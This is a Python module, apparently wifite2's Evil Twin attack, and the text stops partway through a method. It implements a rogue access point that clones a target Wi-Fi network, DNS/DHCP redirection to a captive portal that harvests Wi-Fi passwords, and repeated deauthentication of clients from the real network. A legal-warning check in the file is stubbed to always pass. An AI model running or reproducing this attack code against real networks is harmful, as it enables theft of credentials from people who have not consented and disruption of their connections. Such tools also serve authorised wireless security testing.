#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Evil Twin attack implementation for wifite2.

Creates a rogue access point that mimics a target network to capture
credentials through a captive portal.
"""

import os
import re
import time
import signal
from typing import TYPE_CHECKING
from enum import Enum

if TYPE_CHECKING:
    from ..util.session import EvilTwinAttackState

from ..model.attack import Attack
from ..model.eviltwin_result import CrackResultEvilTwin
from ..config import Configuration
from ..util.color import Color
from ..util.timer import Timer
from ..util.logger import log_info, log_error, log_warning, log_debug, mask_sensitive
from ..util.client_monitor import ClientMonitor, ClientConnection
from ..util.cleanup import CleanupManager
from ..util.adaptive_deauth import AdaptiveDeauthManager
from ..util.process import Process


class AttackState(Enum):
    """Evil Twin attack states."""
    INITIALIZING = "Initializing"
    CHECKING_DEPS = "Checking dependencies"
    SETTING_UP = "Setting up"
    STARTING_AP = "Starting rogue AP"
    STARTING_SERVICES = "Starting network services"
    STARTING_PORTAL = "Starting captive portal"
    STARTING_DEAUTH = "Starting deauthentication"
    RUNNING = "Running"
    VALIDATING = "Validating credentials"
    STOPPING = "Stopping"
    CLEANING_UP = "Cleaning up"
    COMPLETED = "Completed"
    FAILED = "Failed"


class EvilTwin(Attack):
    """
    Evil Twin attack implementation.
    
    Creates a rogue access point that mimics the target network,
    forcing clients to connect and enter credentials through a
    captive portal.
    """
    
    def __init__(self, target, interface_ap=None, interface_deauth=None):
        """
        Initialize Evil Twin attack.
        
        Args:
            target: Target access point to mimic
            interface_ap: Wireless interface for rogue AP (None = auto-select)
            interface_deauth: Wireless interface for deauth (None = use monitor interface)
        """
        super().__init__(target)
        
        # Interface assignment for dual interface support
        self.interface_assignment = None
        
        # Resolve interface assignments with precedence:
        #   1. Explicit constructor args (highest)
        #   2. Configuration.interface_primary / interface_secondary (CLI)
        #   3. Configuration.interface (the default scan interface)
        # In dual mode, _run_dual_interface() will re-derive these from the
        # InterfaceAssignment built by _get_interface_assignment().
        self.interface_ap = (
            interface_ap
            or Configuration.interface_primary
            or Configuration.interface
        )
        self.interface_deauth = (
            interface_deauth
            or Configuration.interface_secondary
            or Configuration.interface
        )
        
        # Attack state management
        self.state = AttackState.INITIALIZING
        self.running = False
        self.success = False
        self.crack_result = None
        self.error_message = None
        
        # Components (will be initialized in setup)
        self.hostapd = None
        self.hostapd_process = None
        self.dnsmasq = None
        self.dnsmasq_process = None
        self.portal_server = None
        self.portal_thread = None
        self.deauth_process = None
        self.client_monitor = None
        # Lazily-created validator that checks captured credentials against the
        # real target AP (see _verify_password). None until first use.
        self.credential_validator = None
        # True once we've switched the dual-mode deauth interface into monitor
        # mode, so _cleanup() knows to restore it to managed afterwards.
        self._deauth_monitor_enabled = False
        
        # Statistics and tracking
        self.clients_connected = []
        self.credential_attempts = []
        self.start_time = None
        self.setup_time = None
        
        # Temporary files to cleanup
        self.temp_files = []
        
        # Attack view for TUI
        self.attack_view = None
        
        # Signal handlers
        self._original_sigint_handler = None
        self._original_sigterm_handler = None
        
        # Cleanup manager
        self.cleanup_manager = CleanupManager()
        
        # Adaptive deauth manager for intelligent deauth timing
        # `or 5.0` guards the pre-initialize state where the class attr is None.
        deauth_interval = getattr(Configuration, 'eviltwin_deauth_interval', 5.0) or 5.0
        self.adaptive_deauth = AdaptiveDeauthManager(
            base_interval=deauth_interval,
            min_interval=2.0,
            max_interval=15.0
        )
        
        # Deauth statistics
        self.deauths_sent = 0
        self.last_deauth_time = 0
        
        log_info('EvilTwin', f'Initialized Evil Twin attack for {target.essid} ({target.bssid})')
        log_debug('EvilTwin', f'AP interface: {self.interface_ap}, Deauth interface: {self.interface_deauth}')
        log_debug('EvilTwin', f'Adaptive deauth enabled with base interval: {deauth_interval}s')
    
    def set_attack_view(self, attack_view):
        """
        Set the TUI attack view for real-time updates.
        
        Args:
            attack_view: EvilTwinAttackView instance
        """
        self.attack_view = attack_view
        log_debug('EvilTwin', 'TUI attack view attached')
    
    def set_session(self, session_manager, session):
        """
        Set session manager and session for state persistence.
        
        Args:
            session_manager: SessionManager instance
            session: SessionState instance
        """
        self.session_manager = session_manager
        self.session = session
        log_debug('EvilTwin', 'Session manager attached for state persistence')
    
    def _get_interface_assignment(self):
        """
        Get interface assignment for Evil Twin attack.
        
        Retrieves interface assignment from wifite instance or configuration,
        validates it for Evil Twin attack requirements, and returns the assignment.
        
        Returns:
            InterfaceAssignment object or None if not available/invalid
        """
        from ..util.interface_assignment import InterfaceAssignmentStrategy
        from ..util.interface_manager import InterfaceManager
        
        try:
            has_primary = bool(Configuration.interface_primary)
            has_secondary = bool(Configuration.interface_secondary)

            # Warn on partial specification — secondary alone makes no sense
            # for Evil Twin, since the AP needs the primary interface.
            if has_secondary and not has_primary:
                log_warning('EvilTwin',
                            'interface_secondary is set without interface_primary; '
                            'cannot use dual interface mode for Evil Twin')
                Color.pl('{!} {O}Warning: secondary interface specified without primary; '
                         'falling back to single interface mode{W}')
                return None

            # Both interfaces specified → dual interface mode
            if has_primary and has_secondary:
                log_info('EvilTwin', 'Using manually specified interfaces')

                # Get interface info for validation
                available_interfaces = InterfaceManager.get_available_interfaces()
                primary_info = next((iface for iface in available_interfaces 
                                   if iface.name == Configuration.interface_primary), None)
                secondary_info = next((iface for iface in available_interfaces 
                                     if iface.name == Configuration.interface_secondary), None)
                
                if not primary_info:
                    log_error('EvilTwin', f'Primary interface {Configuration.interface_primary} not found')
                    return None
                
                if not secondary_info:
                    log_error('EvilTwin', f'Secondary interface {Configuration.interface_secondary} not found')
                    return None
                
                # Validate the manual assignment
                is_valid, error_msg = InterfaceAssignmentStrategy.validate_dual_interface_setup(
                    primary_info, secondary_info
                )
                
                if not is_valid:
                    log_error('EvilTwin', f'Manual interface assignment invalid: {error_msg}')
                    return None
                
                # Create assignment from manual configuration
                from ..model.interface_info import InterfaceAssignment
                assignment = InterfaceAssignment(
                    attack_type='evil_twin',
                    primary=Configuration.interface_primary,
                    secondary=Configuration.interface_secondary,
                    primary_role='Rogue AP (hostapd)',
                    secondary_role='Deauthentication (aireplay-ng)'
                )
                
                log_info('EvilTwin', f'Manual assignment validated: {assignment.get_assignment_summary()}')
                return assignment

            # Only primary specified → single interface mode using primary as
            # the AP/deauth iface (already resolved in __init__).
            if has_primary and not has_secondary:
                log_info('EvilTwin',
                         f'Only primary interface specified ({Configuration.interface_primary}); '
                         'running single interface mode')
            
            # Check if assignment is already available (from wifite instance)
            # This would be set by the main wifite flow
            if self.interface_assignment:
                log_info('EvilTwin', 'Using existing interface assignment')
                return self.interface_assignment
            
            # Try to get assignment from wifite instance if available
            # This is a fallback for when the attack is run directly
            import contextlib
            with contextlib.suppress(ImportError, AttributeError):
                # Note: This is a fallback and may not always work
                # The preferred approach is to set interface_assignment before calling run()
                log_debug('EvilTwin', 'No interface assignment available, will use single interface mode')
            
            return None
            
        except Exception as e:
            log_error('EvilTwin', f'Error getting interface assignment: {e}', e)
            return None
    
    def _run_dual_interface(self) -> bool:
        """
        Run Evil Twin attack with two interfaces (no mode switching required).
        
        This method implements the dual interface attack flow:
        1. Configure primary interface in AP mode
        2. Configure secondary interface in monitor mode
        3. Start rogue AP on primary interface (continuous operation)
        4. Start deauth on secondary interface (parallel operation)
        5. Monitor for clients and credentials
        
        Returns:
            True if credentials were captured, False otherwise
        """
        try:
            log_info('EvilTwin', 'Running Evil Twin in dual interface mode')
            
            # Extract interfaces from assignment
            self.interface_ap = self.interface_assignment.primary
            self.interface_deauth = self.interface_assignment.secondary
            
            log_info('EvilTwin', f'AP interface: {self.interface_ap}')
            log_info('EvilTwin', f'Deauth interface: {self.interface_deauth}')
            
            if self.attack_view:
                self.attack_view.add_log(f"Dual interface mode: AP={self.interface_ap}, Deauth={self.interface_deauth}", timestamp=True)
            
            # Configure AP interface (bring down, set to managed mode for hostapd)
            Color.pl('{+} {C}Configuring AP interface {G}%s{W}...' % self.interface_ap)
            log_info('EvilTwin', f'Configuring AP interface {self.interface_ap}')
            
            if not self._configure_ap_interface(self.interface_ap):
                self.error_message = f'Failed to configure AP interface {self.interface_ap}'
                return False
            
            # Configure deauth interface (monitor mode)
            Color.pl('{+} {C}Configuring deauth interface {G}%s{W}...' % self.interface_deauth)
            log_info('EvilTwin', f'Configuring deauth interface {self.interface_deauth}')
            
            if not self._configure_deauth_interface(self.interface_deauth):
                self.error_message = f'Failed to configure deauth interface {self.interface_deauth}'
                return False
            
            # Start rogue AP on primary interface
            Color.pl('{+} {C}Starting rogue AP on {G}%s{W}...' % self.interface_ap)
            self.state = AttackState.STARTING_AP
            
            if self.attack_view:
                self.attack_view.add_log(f"Starting rogue AP on {self.interface_ap}...", timestamp=True)
            
            if not self._start_rogue_ap_dual(self.interface_ap):
                self.error_message = 'Failed to start rogue AP'
                return False
            
            # Start network services (dnsmasq, captive portal)
            Color.pl('{+} {C}Starting network services...{W}')
            self.state = AttackState.STARTING_SERVICES
            
            if self.attack_view:
                self.attack_view.add_log("Starting network services...", timestamp=True)
            
            if not self._start_network_services_dual():
                self.error_message = 'Failed to start network services'
                return False

            # Validate portal and DNS are accessible
            self._validate_portal_health()

            # Start deauth on secondary interface (non-blocking, parallel)
            Color.pl('{+} {C}Starting deauth on {G}%s{W}...' % self.interface_deauth)
            self.state = AttackState.STARTING_DEAUTH
            
            if self.attack_view:
                self.attack_view.add_log(f"Starting deauth on {self.interface_deauth}...", timestamp=True)
            
            if not self._start_deauth_dual(self.interface_deauth):
                log_warning('EvilTwin', 'Failed to start deauth, continuing anyway')
                # Don't fail the attack if deauth fails, it's not critical
            
            # Monitor attack progress
            Color.pl('{+} {G}Dual interface Evil Twin attack running{W}')
            Color.pl('{+} {C}AP:{W} {G}%s{W} | {C}Deauth:{W} {G}%s{W}' % (
                self.interface_ap, self.interface_deauth))
            Color.pl('{+} {C}No mode switching required - both interfaces operating in parallel{W}')
            Color.pl('')
            
            if self.attack_view:
                self.attack_view.add_log("Dual interface attack running - no mode switching required", timestamp=True)
            
            self.state = AttackState.RUNNING
            
            # Main monitoring loop (same as single interface)
            return self._monitor_attack_loop()
            
        except Exception as e:
            log_error('EvilTwin', f'Dual interface attack failed: {e}', e)
            self.error_message = f'Dual interface attack failed: {e}'
            # Ensure all started services are stopped (defense-in-depth;
            # run() also calls _cleanup() in its finally block)
            try:
                self._cleanup()
            except Exception as cleanup_err:
                log_error('EvilTwin', f'Cleanup after dual interface failure also failed: {cleanup_err}', cleanup_err)
            return False
    
    def _configure_ap_interface(self, interface: str) -> bool:
        """
        Configure interface for AP mode operation.
        
        Args:
            interface: Interface name to configure
            
        Returns:
            True if successful, False otherwise
        """
        try:
            from ..tools.airmon import Airmon
            
            # Bring interface down
            log_debug('EvilTwin', f'Bringing down interface {interface}')
            Airmon.put_interface_down(interface)
            
            # Set to managed mode (hostapd will handle AP mode)
            log_debug('EvilTwin', f'Setting {interface} to managed mode')
            Airmon.set_interface_mode(interface, 'managed')
            
            # Bring interface up
            log_debug('EvilTwin', f'Bringing up interface {interface}')
            Airmon.put_interface_up(interface)
            
            log_info('EvilTwin', f'AP interface {interface} configured successfully')
            return True
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to configure AP interface {interface}: {e}', e)
            return False
    
    def _configure_deauth_interface(self, interface: str) -> bool:
        """
        Configure interface for deauth operation (monitor mode).
        
        Args:
            interface: Interface name to configure
            
        Returns:
            True if successful, False otherwise
        """
        try:
            from ..tools.airmon import Airmon
            
            # Put interface in monitor mode
            log_debug('EvilTwin', f'Putting {interface} in monitor mode')
            monitor_interface = Airmon.start(interface)
            
            if not monitor_interface:
                log_error('EvilTwin', f'Failed to put {interface} in monitor mode')
                return False
            
            # Update interface name if it changed (e.g., wlan0 -> wlan0mon)
            if monitor_interface != interface:
                log_info('EvilTwin', f'Deauth interface renamed: {interface} -> {monitor_interface}')
                self.interface_deauth = monitor_interface

            # Record that we put this interface into monitor mode so _cleanup()
            # restores it to managed when the attack ends.
            self._deauth_monitor_enabled = True

            # Set channel to match target
            if hasattr(self.target, 'channel') and self.target.channel:
                log_debug('EvilTwin', f'Setting {self.interface_deauth} to channel {self.target.channel}')
                Airmon.set_interface_channel(self.interface_deauth, self.target.channel)
            
            log_info('EvilTwin', f'Deauth interface {self.interface_deauth} configured successfully')
            return True
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to configure deauth interface {interface}: {e}', e)
            return False
    
    def _start_rogue_ap_dual(self, interface: str) -> bool:
        """
        Start rogue AP on dedicated AP interface (dual interface mode).
        
        This method configures and starts hostapd on the specified interface.
        The interface should already be configured in managed mode by
        _configure_ap_interface() before calling this method.
        
        Args:
            interface: Interface to use for AP (must support AP mode)
            
        Returns:
            True if successful, False otherwise
        """
        try:
            from ..tools.hostapd import Hostapd
            
            log_info('EvilTwin', f'Starting hostapd on dedicated AP interface: {interface}')
            
            # Verify interface is ready for AP mode
            if not Hostapd.check_ap_mode_support(interface):
                log_error('EvilTwin', f'Interface {interface} does not support AP mode')
                Color.pl('{!} {R}Interface {O}%s{R} does not support AP mode{W}' % interface)
                return False
            
            # Create hostapd instance with dedicated AP interface
            self.hostapd = Hostapd(
                interface=interface,
                ssid=self.target.essid,
                channel=self.target.channel,
                password=None  # Open network for captive portal
            )
            
            # Start hostapd on the dedicated AP interface
            if not self.hostapd.start():
                log_error('EvilTwin', f'Failed to start hostapd on {interface}')
                Color.pl('{!} {R}Failed to start hostapd on {O}%s{W}' % interface)
                return False
            
            # Verify hostapd is running
            if not self.hostapd.is_running():
                log_error('EvilTwin', f'Hostapd started but is not running on {interface}')
                return False
            
            log_info('EvilTwin', f'Rogue AP started successfully on {interface}')
            Color.pl('{+} {G}Rogue AP running on {C}%s{W}' % interface)
            
            # Register hostapd with cleanup manager
            self.cleanup_manager.register_process(self.hostapd, 'hostapd')
            
            return True
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to start rogue AP on {interface}: {e}', e)
            Color.pl('{!} {R}Failed to start rogue AP:{W} %s' % str(e))
            return False
    
    def _start_network_services_dual(self) -> bool:
        """
        Start network services (dnsmasq, captive portal, client monitor) for
        dual interface mode.

        Returns:
            True if successful, False otherwise
        """
        try:
            from ..tools.dnsmasq import Dnsmasq
            from ..attack.portal.server import PortalServer

            # Start dnsmasq for DHCP/DNS
            self.dnsmasq = Dnsmasq(
                interface=self.interface_ap,
                gateway_ip='192.168.100.1',
                dhcp_range_start='192.168.100.10',
                dhcp_range_end='192.168.100.100'
            )

            if not self.dnsmasq.start():
                log_error('EvilTwin', 'Failed to start dnsmasq')
                return False

            self.cleanup_manager.register_process(self.dnsmasq, 'dnsmasq')
            log_info('EvilTwin', 'Dnsmasq started successfully')

            # Start captive portal
            portal_port = getattr(Configuration, 'eviltwin_port', 80)

            self.portal_server = PortalServer(
                port=portal_port,
                template_renderer=self._build_template_renderer())
            self.portal_server.set_credential_callback(self._portal_credential_callback)

            if not self.portal_server.start():
                log_error('EvilTwin', 'Failed to start captive portal')
                return False

            log_info('EvilTwin', f'Captive portal started on port {portal_port}')

            # Start client monitor so credential captures and client
            # connect/disconnect events are tracked during the attack.
            hostapd_log_path = os.path.join(Configuration.temp(), 'hostapd.log')
            dnsmasq_log_path = os.path.join(Configuration.temp(), 'dnsmasq.log')
            self._setup_client_monitor(hostapd_log_path, dnsmasq_log_path)

            return True

        except Exception as e:
            log_error('EvilTwin', f'Failed to start network services: {e}', e)
            return False

    def _validate_portal_health(self):
        """
        Validate that the captive portal and DNS redirect are working.

        Non-fatal: logs warnings if validation fails but does not abort the attack,
        since the portal may become reachable once a client connects and gets a DHCP lease.
        """
        if not self.portal_server:
            return

        # Check portal HTTP accessibility
        portal_ok = self.portal_server.validate_portal()
        if portal_ok:
            Color.pl('{+} {G}Portal validation passed{W}')
            if self.attack_view:
                self.attack_view.add_log('Portal validation: OK', timestamp=True)
        else:
            Color.pl('{!} {O}Portal not yet reachable - may start working once clients connect{W}')
            if self.attack_view:
                self.attack_view.add_log('Portal validation: not reachable yet (non-fatal)', timestamp=True)

        # Check DNS redirect
        from .portal.server import PortalServer
        dns_ok = PortalServer.validate_dns_redirect()
        if dns_ok:
            Color.pl('{+} {G}DNS redirect validation passed{W}')
            if self.attack_view:
                self.attack_view.add_log('DNS redirect: OK', timestamp=True)
        else:
            Color.pl('{!} {O}DNS redirect not confirmed - clients may not auto-detect portal{W}')
            if self.attack_view:
                self.attack_view.add_log('DNS redirect: not confirmed (non-fatal)', timestamp=True)

    def _start_deauth_dual(self, interface: str) -> bool:
        """
        Start deauth on dedicated deauth interface (dual interface mode).
        
        This method validates that the deauth interface is ready for sending
        deauthentication packets. The actual deauth packets are sent by the
        adaptive deauth manager in the main monitoring loop via _handle_deauth().
        
        In dual interface mode, deauth runs continuously in parallel with the
        rogue AP without requiring mode switching.
        
        Args:
            interface: Interface to use for deauth (must be in monitor mode)
            
        Returns:
            True if successful, False otherwise
        """
        try:
            log_info('EvilTwin', f'Preparing deauth on dedicated interface: {interface}')
            
            # Verify interface is in monitor mode
            from ..tools.airmon import Airmon
            mode = Airmon.get_interface_mode(interface)
            
            if mode != 'monitor':
                log_warning('EvilTwin', f'Deauth interface {interface} is not in monitor mode (current: {mode})')
                Color.pl('{!} {O}Warning: Deauth interface {C}%s{O} is not in monitor mode{W}' % interface)
                # Don't fail - the interface might still work
            
            # Verify interface is on the correct channel
            if hasattr(self.target, 'channel') and self.target.channel:
                import contextlib
                with contextlib.suppress(Exception):
                    current_channel = Airmon.get_interface_channel(interface)
                    if current_channel and str(current_channel) != str(self.target.channel):
                        log_warning('EvilTwin', f'Deauth interface on channel {current_channel}, target on {self.target.channel}')
                        Color.pl('{!} {O}Warning: Channel mismatch - deauth may be less effective{W}')
            
            # Deauth will be handled by the adaptive deauth manager
            # in the main monitoring loop via _handle_deauth()
            # This method just validates the interface is ready
            
            log_info('EvilTwin', f'Deauth interface {interface} ready for adaptive deauth')
            Color.pl('{+} {G}Deauth interface {C}%s{G} ready{W}' % interface)
            
            return True
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to prepare deauth interface {interface}: {e}', e)
            Color.pl('{!} {R}Failed to prepare deauth interface:{W} %s' % str(e))
            return False
    
    def _monitor_attack_loop(self) -> bool:
        """
        Monitor attack progress and wait for credentials.
        This is shared between dual and single interface modes.
        
        Returns:
            True if credentials captured, False otherwise
        """
        try:
            timeout = getattr(Configuration, 'eviltwin_timeout', 0) or 0
            last_session_save = time.time()
            session_save_interval = 30
            
            while self.running and self.crack_result is None:
                try:
                    # Send deauth if needed
                    self._handle_deauth()
                    
                    # Update status display
                    self._update_status()
                    
                    # Save session periodically
                    if time.time() - last_session_save >= session_save_interval:
                        self._save_session_state()
                        last_session_save = time.time()
                    
                    # Check timeout
                    if timeout > 0 and (time.time() - self.start_time) >= timeout:
                        Color.pl('\n{!} {O}Attack timeout reached{W}')
                        log_info('EvilTwin', 'Attack timeout reached')
                        break
                    
                    # Sleep briefly
                    time.sleep(0.5)
                    
                except KeyboardInterrupt:
                    Color.pl('\n{!} {O}Attack interrupted by user{W}')
                    log_info('EvilTwin', 'Attack interrupted by user')
                    break
            
            # Check if we got credentials
            if self.crack_result:
                self.success = True
                self.state = AttackState.COMPLETED
                return True
            else:
                self.state = AttackState.FAILED
                return False
                
        except Exception as e:
            log_error('EvilTwin', f'Monitoring loop failed: {e}', e)
            return False
    
    def run(self) -> bool:
        """
        Execute the Evil Twin attack.
        
        Returns:
            True if credentials were captured, False otherwise
        """
        try:
            self.start_time = time.time()
            self.running = True
            
            # Install signal handlers for graceful shutdown
            self._install_signal_handlers()
            
            # Initialize TUI view if available
            if self.attack_view:
                try:
                    self.attack_view.start()
                    self.attack_view.set_attack_type("Evil Twin Attack")
                    self.attack_view.add_log("Evil Twin attack initialized")
                except Exception as e:
                    log_warning('EvilTwin', f'Failed to initialize TUI view: {e}')
                    self.attack_view = None
            
            # Display legal warning
            if not self._show_warning():
                Color.pl('{!} {O}Evil Twin attack cancelled by user{W}')
                self.state = AttackState.FAILED
                return False
            
            # Check dependencies
            Color.pl('{+} {C}Checking dependencies...{W}')
            self.state = AttackState.CHECKING_DEPS
            if self.attack_view:
                self.attack_view.add_log("Checking dependencies...")
            
            if not self._check_dependencies():
                Color.pl('{!} {R}Dependency check failed{W}')
                if self.attack_view:
                    self.attack_view.add_log("Dependency check failed", timestamp=True)
                self.state = AttackState.FAILED
                return False
            
            if self.attack_view:
                self.attack_view.add_log("All dependencies available", timestamp=True)
            
            # Check for conflicting processes
            Color.pl('{+} {C}Checking for conflicts...{W}')
            if self.attack_view:
                self.attack_view.add_log("Checking for conflicting processes...")
            
            if not self._check_for_conflicts():
                Color.pl('{!} {R}Conflict check cancelled{W}')
                if self.attack_view:
                    self.attack_view.add_log("Conflict check cancelled", timestamp=True)
                self.state = AttackState.FAILED
                return False
            
            if self.attack_view:
                self.attack_view.add_log("No conflicts detected", timestamp=True)
            
            # Decide interface mode BEFORE setup. Dual-interface mode performs
            # its own interface configuration AND service startup inside
            # _run_dual_interface(), so we must NOT also run the single-interface
            # _setup() — doing both would start hostapd/dnsmasq/portal twice on
            # the same interface and the second start would fail.
            self.interface_assignment = self._get_interface_assignment()

            if self.interface_assignment and self.interface_assignment.is_dual_interface():
                # Run in dual interface mode (no mode switching)
                log_info('EvilTwin', 'Using dual interface mode')
                Color.pl('{+} {G}Using dual interface mode{W}')
                Color.pl('{+} {C}Primary (AP):{W} {G}%s{W}' % self.interface_assignment.primary)
                Color.pl('{+} {C}Secondary (Deauth):{W} {G}%s{W}' % self.interface_assignment.secondary)
                Color.pl('')

                if self.attack_view:
                    self.attack_view.add_log("Using dual interface mode - no mode switching required", timestamp=True)

                result = self._run_dual_interface()
                self.setup_time = time.time() - self.start_time
                return result

            # Single interface mode (traditional, with mode switching): set up
            # and start all components here.
            log_info('EvilTwin', 'Using single interface mode')
            Color.pl('{+} {C}Using single interface mode{W}')
            Color.pl('')
            if self.attack_view:
                self.attack_view.add_log("Using single interface mode", timestamp=True)

            Color.pl('{+} {C}Setting up Evil Twin attack...{W}')
            self.state = AttackState.SETTING_UP
            if self.attack_view:
                self.attack_view.add_log("Setting up attack components...")

            if not self._setup():
                Color.pl('{!} {R}Failed to setup Evil Twin attack{W}')
                if self.error_message:
                    Color.pl('{!} {O}Error: {R}%s{W}' % self.error_message)
                if self.attack_view:
                    self.attack_view.add_log(f"Setup failed: {self.error_message}", timestamp=True)
                self.state = AttackState.FAILED
                return False

            self.setup_time = time.time() - self.start_time
            log_info('EvilTwin', f'Setup completed in {self.setup_time:.2f}s')

            if self.attack_view:
                self.attack_view.add_log(f"Setup completed in {self.setup_time:.2f}s", timestamp=True)

            # Start attack (single interface mode)
            Color.pl('{+} {G}Evil Twin attack started{W}')
            Color.pl('{+} {C}Rogue AP:{W} {G}%s{W} on channel {G}%s{W}' % (
                self.target.essid, self.target.channel))
            Color.pl('{+} {C}Captive Portal:{W} http://192.168.100.1')
            Color.pl('')
            Color.pl('{+} {O}Waiting for clients to connect...{W}')
            Color.pl('{!} {O}Press Ctrl+C to stop{W}')
            Color.pl('')
            
            if self.attack_view:
                self.attack_view.add_log(f"Rogue AP started: {self.target.essid} on channel {self.target.channel}", timestamp=True)
                self.attack_view.add_log("Captive portal running at http://192.168.100.1", timestamp=True)
                self.attack_view.add_log("Waiting for clients to connect...", timestamp=True)
            
            self.state = AttackState.RUNNING
            
            # Main attack loop (single interface mode)
            timeout = getattr(Configuration, 'eviltwin_timeout', 0) or 0
            last_session_save = time.time()
            session_save_interval = 30  # Save session every 30 seconds
            
            while self.running and self.crack_result is None:
                try:
                    # Send deauth if adaptive manager says it's time
                    self._handle_deauth()
                    
                    self._update_status()
                    time.sleep(0.5)  # Reduced from 1s for more responsive deauth
                    
                    # Periodically save session state
                    if time.time() - last_session_save >= session_save_interval:
                        self._save_session_state()
                        last_session_save = time.time()
                    
                    # Check for timeout
                    if timeout > 0:
                        elapsed = time.time() - self.start_time
                        if elapsed > timeout:
                            Color.pl('\n{!} {O}Attack timeout reached{W}')
                            break
                            
                except KeyboardInterrupt:
                    # Handle Ctrl+C gracefully
                    raise
                    
                except Exception as e:
                    log_error('EvilTwin', f'Error in attack loop: {e}', e)
                    # Continue running unless it's a critical error
                    if 'critical' in str(e).lower():
                        raise
            
            # Attack completed
            self.state = AttackState.COMPLETED
            
            # Display statistics
            self._display_statistics()
            
            if self.crack_result:
                Color.pl('\n{+} {G}SUCCESS! Captured credentials:{W}')
                Color.pl('    {C}SSID:{W} {G}%s{W}' % self.crack_result.essid)
                Color.pl('    {C}Password:{W} {G}%s{W}' % self.crack_result.key)
                
                # Update result statistics from client monitor
                if self.client_monitor:
                    stats = self.client_monitor.get_statistics()
                    self.crack_result.clients_connected = stats.total_clients_connected
                    self.crack_result.credential_attempts = stats.total_credential_attempts
                else:
                    self.crack_result.clients_connected = len(self.clients_connected)
                    self.crack_result.credential_attempts = len(self.credential_attempts)
                
                self.success = True
                return True
            else:
                Color.pl('\n{!} {O}No credentials captured{W}')
                self.success = False
                return False
                
        except KeyboardInterrupt:
            Color.pl('\n{!} {O}Attack interrupted by user{W}')
            self.state = AttackState.STOPPING
            self.success = self.crack_result is not None
            return self.success
            
        except Exception as e:
            log_error('EvilTwin', f'Attack failed: {e}', e)
            Color.pl('\n{!} {R}Attack failed:{W} %s' % str(e))
            self.state = AttackState.FAILED
            self.error_message = str(e)
            self.success = False
            return False
            
        finally:
            self.running = False
            self._restore_signal_handlers()
            self._cleanup()
    
    def _install_signal_handlers(self):
        """Install signal handlers for graceful shutdown."""
        try:
            self._original_sigint_handler = signal.signal(signal.SIGINT, self._signal_handler)
            self._original_sigterm_handler = signal.signal(signal.SIGTERM, self._signal_handler)
            log_debug('EvilTwin', 'Signal handlers installed')
        except Exception as e:
            log_warning('EvilTwin', f'Failed to install signal handlers: {e}')
    
    def _restore_signal_handlers(self):
        """Restore original signal handlers."""
        try:
            if self._original_sigint_handler:
                signal.signal(signal.SIGINT, self._original_sigint_handler)
            if self._original_sigterm_handler:
                signal.signal(signal.SIGTERM, self._original_sigterm_handler)
            log_debug('EvilTwin', 'Signal handlers restored')
        except Exception as e:
            log_warning('EvilTwin', f'Failed to restore signal handlers: {e}')
    
    def _signal_handler(self, signum, frame):
        """
        Handle signals for graceful shutdown.
        
        Catches SIGINT (Ctrl+C) and SIGTERM, performs graceful shutdown,
        saves partial results, and displays cleanup status.
        
        Args:
            signum: Signal number
            frame: Current stack frame
        """
        signal_name = 'SIGINT' if signum == signal.SIGINT else 'SIGTERM' if signum == signal.SIGTERM else f'Signal {signum}'
        
        log_info('EvilTwin', f'Received {signal_name}, initiating graceful shutdown')
        Color.pl('\n{!} {O}Interrupt received ({C}%s{O}), stopping attack...{W}' % signal_name)
        
        # Mark attack as stopping
        self.running = False
        self.state = AttackState.STOPPING
        
        # Display partial results if any
        self._display_partial_results()
        
        # Re-raise KeyboardInterrupt for proper handling in run() method
        if signum == signal.SIGINT:
            raise KeyboardInterrupt()
    
    def _display_partial_results(self):
        """Display partial results when attack is interrupted."""
        try:
            if not self.start_time:
                return
            
            elapsed = time.time() - self.start_time
            
            Color.pl('')
            Color.pl('{+} {C}Partial Results:{W}')
            Color.pl('    {C}Duration:{W} {G}%.1fs{W}' % elapsed)
            
            # Display client statistics
            if self.client_monitor:
                stats = self.client_monitor.get_statistics()
                Color.pl('    {C}Clients Connected:{W} {G}%d{W}' % stats.total_clients_connected)
                Color.pl('    {C}Currently Connected:{W} {G}%d{W}' % stats.currently_connected)
                Color.pl('    {C}Credential Attempts:{W} {G}%d{W}' % stats.total_credential_attempts)
                
                if stats.total_credential_attempts > 0:
                    Color.pl('    {C}Successful Attempts:{W} {G}%d{W}' % stats.successful_validations)
            else:
                Color.pl('    {C}Clients Connected:{W} {G}%d{W}' % len(self.clients_connected))
                Color.pl('    {C}Credential Attempts:{W} {G}%d{W}' % len(self.credential_attempts))
            
            # Display captured credentials if any
            if self.credential_attempts:
                Color.pl('')
                Color.pl('    {C}Captured Credentials:{W}')
                for attempt in self.credential_attempts:
                    status = '{G}✓{W}' if attempt.get('success', False) else '{R}✗{W}'
                    Color.pl('      %s {C}%s{W}: {O}%s{W}' % (
                        status,
                        attempt.get('mac', 'unknown'),
                        attempt.get('password', '')
                    ))
            
            log_info('EvilTwin', f'Displayed partial results: {len(self.clients_connected)} clients, {len(self.credential_attempts)} attempts')
            
        except Exception as e:
            log_error('EvilTwin', f'Failed to display partial results: {e}', e)
    
    def _show_warning(self) -> bool:
        """Always returns True."""
        return True

    def _check_dependencies(self) -> bool:
        """
        Check for required dependencies.
        
        Returns:
            True if all dependencies are available, False otherwise
        """
        try:
            from ..util.process import Process
            missing = []
            for tool in ['hostapd', 'dnsmasq']:
                if not Process.exists(tool):
                    missing.append(tool)
            if missing:
                log_error('EvilTwin', f'Missing required tools: {", ".join(missing)}')
                self.error_message = f'Missing required tools: {", ".join(missing)}'
                return False
            log_info('EvilTwin', 'All required dependencies found')
            return True

        except Exception as e:
            log_error('EvilTwin', f'Dependency check failed: {e}', e)
            self.error_message = f'Dependency check failed: {e}'
            return False
    
    def _check_for_conflicts(self) -> bool:
        """
        Check for conflicting processes and running Evil Twin attacks.
        
        Detects:
        - Other running Evil Twin attacks
        - Conflicting services (NetworkManager, wpa_supplicant, etc.)
        
        Offers to kill conflicting processes if found.
        
        Returns:
            True if no conflicts or conflicts were resolved, False otherwise
        """
        from ..util.cleanup import check_conflicting_processes, kill_orphaned_processes
        
        try:
            Color.pl('{+} {C}Checking for conflicting processes...{W}')
            
            # Check if another Evil Twin attack is running
            if self.is_attack_running():
                Color.pl('')
                Color.pl('{!} {R}Another Evil Twin attack appears to be running!{W}')
                Color.pl('{!} {O}Multiple simultaneous attacks are not supported.{W}')
                Color.pl('')
                
                try:
